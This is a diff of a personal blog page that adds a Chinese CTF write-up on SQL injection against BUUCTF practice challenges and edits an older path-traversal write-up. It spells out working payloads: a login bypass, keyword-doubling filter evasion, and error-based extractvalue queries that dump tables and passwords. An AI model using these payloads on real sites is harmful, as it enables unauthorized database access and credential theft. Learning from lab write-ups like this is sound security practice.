@@ -147,6 +147,92 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/02/01/SQL%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="六公子买单">
+      <meta itemprop="description" content="一头努力的菜鸟">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Daq1ang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/02/01/SQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL注入</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-02-01 17:54:11" itemprop="dateCreated datePublished" datetime="2021-02-01T17:54:11+08:00">2021-02-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-02-18 18:00:25" itemprop="dateModified" datetime="2021-02-18T18:00:25+08:00">2021-02-18</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="1-buu-SUCTF-2019-EasySQL"><a href="#1-buu-SUCTF-2019-EasySQL" class="headerlink" title="1.buu-[SUCTF 2019]EasySQL"></a>1.buu-[SUCTF 2019]EasySQL</h1><p><img src="images/buusql1.0.png" alt="buu-sql.png"><br>发现昨天用的堆叠注入可以直接查表<br><img src="images/buusql1.0.png" alt="buu-sql.png"><br>发现了表Flag,但是无法用show columns from Flag读取其中的列<br>好，看看大佬们的WP：“后端既然能做到数字回显字母不回显，说明有一个 或 结构，而且不直接回显flag，但作为一道题目，from一定是from flag”猜出后端源码select $_POST[‘query’] || flag from Flag,<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/stevenonesir/article/details/110203051?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%5BSUCTF%202019%5DEasySQL&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-110203051.pc_search_result_hbase_insert&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/stevenonesir/article/details/110203051?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%5BSUCTF%202019%5DEasySQL&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-110203051.pc_search_result_hbase_insert&amp;spm=1018.2226.3001.4187</a><br>挺无语的，直接看大佬讲解吧<br>今天先搞别的        </p>
+<hr>
+<h1 id="buu-极客大挑战-2019-EasySQL"><a href="#buu-极客大挑战-2019-EasySQL" class="headerlink" title="buu-[极客大挑战 2019]EasySQL"></a>buu-[极客大挑战 2019]EasySQL</h1><p>进入靶机<br><img src="images/buusql2.0.png" alt="buu-sql.png"><br>用万能密码试一试<br><img src="images/buusql2.1.png" alt="buu-sql.png"><br>用户名和密码都输入   admin’ or ‘1’=’1<br>得到flag     </p>
+<h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p>先尝试万能密码登录，最后发现<br>?username=admin’–+&amp;password=1登陆成功  </p>
+<ul>
+<li>查字段<br>?username=admin’ order by 3–+&amp;password=1<br>报错：<br>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘der 3– ‘ and password=’1’’ at line 1，发现语句中order by 就剩der了，说明过滤了or和by,<br>双写绕过：?username=admin’ oorrder bbyy 4–+&amp;password=1</li>
+<li>查得有3个字段，开始联合查询<br>?username=-admin’ union select 1,2,3–+&amp;password=1找回显，<br>又有报错：check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘1,2,3– ‘ and password=’1’’ at line 1<br>过滤了union 和 select，再双写绕过：<br>?username=-admin’ ununionion seselectlect 1,2,3–+&amp;password=1有回显  </li>
+<li>查当前数据库为geek,查该数据库的表：<br>?username=-admin’ ununionion seselectlect 1,2,group_concat(table_name) from information_schema.tables where table_schema=’geek’–+&amp;password=1，有报错：<br>check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘.tables table_schema=’geek’– ‘ and password=’1’’ at line 1<br>过滤了from和where，继续双写绕过<br>结果：Table ‘infmation_schema.tables’ doesn’t exist，<br>卧槽，小细节啊，上面过滤了or，所以information里面的or也要双写<br>（查所有数据库，查ctf里面的表，查Flag里面的列，查flag里面的字段）</li>
+</ul>
+<hr>
+<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>报错注入：  （过滤了空格，用括号代替）<br>查数据库</p>
+<pre><code>/check.php?username=admin&amp;password=admin&#39;^extractvalue(1,concat(0x7e,(select(database()))))%23</code></pre>
+<p>查表</p>
+<pre><code>/check.php?username=admin&amp;password=admin&#39;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(&#39;geek&#39;)))))%23</code></pre>
+<p>查字段</p>
+<pre><code>/check.php?username=admin&amp;password=admin&#39;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;)))))%23</code></pre>
+<p>查数据password</p>
+<pre><code>/check.php?username=admin&amp;password=admin&#39;^extractvalue(1,concat(0x7e,(select(password)from(geek.H4rDsq1))))%23</code></pre>
+<p>发现只爆一半</p>
+<pre><code>/check.php?username=admin&amp;password=admin%27^extractvalue(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1))))%23</code></pre>
+<p>left right查左右</p>
+<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>BP抓包fuzz，发现过滤了or xor = 等，<br>没过滤union select，可以查</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -250,10 +336,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2021-01-31 17:28:53 / Modified: 18:19:47" itemprop="dateCreated datePublished" datetime="2021-01-31T17:28:53+08:00">2021-01-31</time>
+              <time title="Created: 2021-01-31 17:28:53" itemprop="dateCreated datePublished" datetime="2021-01-31T17:28:53+08:00">2021-01-31</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-03-17 14:15:25" itemprop="dateModified" datetime="2021-03-17T14:15:25+08:00">2021-03-17</time>
+              </span>
 
           
 
@@ -334,7 +426,7 @@ if (! empty($_REQUEST[&#39;file&#39;])
 <hr>
 <p>观察源码发现hint.php，打开发现<br>flag not here, and flag in ffffllllaaaagggg<br>如果满足相应的条件，include引入文件。只需使emmm::checkFile($_REQUEST[‘file’]返回值为true，利用../跳转目录读取flag即可。<br>payload为：file=source.php?/../ffffllllaaaagggg，经过mb_strpos为source.php?/../ffffllllaaaagggg?,  但是mb_strpos这个函数只返回首次出现的位置，所以还是会返回第一个？的位置，而mb_substr截取函数，从0开始截取一直到第一个？的位置，截取内容为source.php，恰好能与白名单中的进行匹配，可以return true;，所以通过第一次截取进行绕过<br>ffffllllaaaagggg文件和index.php不在同一个目录下，所以读取的是上级目录。构造payload <a target="_blank" rel="noopener" href="http://web5.buuctf.cn/?file=source.php?../../../../../ffffllllaaaagggg%EF%BC%8C%E6%89%BE%E5%88%B0flag%EF%BC%88%E5%88%A9%E7%94%A8/%E4%BD%BFsource.php?%E6%88%90%E4%B8%BA%E4%B8%80%E4%B8%AA%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E7%9B%AE%E5%BD%95%EF%BC%8C%E6%9C%80%E5%90%8Einclude%E5%88%A9%E7%94%A8../%E8%B7%B3%E8%BD%AC%E7%9B%AE%E5%BD%95%E8%AF%BB%E5%8F%96flag%E5%8D%B3%E5%8F%AF%EF%BC%89">http://web5.buuctf.cn/?file=source.php?../../../../../ffffllllaaaagggg，找到flag（利用/使source.php?成为一个不存在的目录，最后include利用../跳转目录读取flag即可）</a>  </p>
 <ul>
-<li>注意：../ 有多少个不一定，因为不知道flag在底几层目录里，需要从没有开始一次加一个去尝试。</li>
+<li>注意：../ 有多少个不一定，因为不知道flag在第几层目录里，需要从没有开始一次加一个去尝试。</li>
 </ul>
 
       
@@ -1129,7 +1221,7 @@ $rest = substr(&quot;abcdef&quot;, -3, 1); // 返回 &quot;d&quot;
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-count">20</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -1138,7 +1230,7 @@ $rest = substr(&quot;abcdef&quot;, -3, 1); // 返回 &quot;d&quot;
         <span class="site-state-item-name">categories</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">tags</span>
       </div>
   </nav>
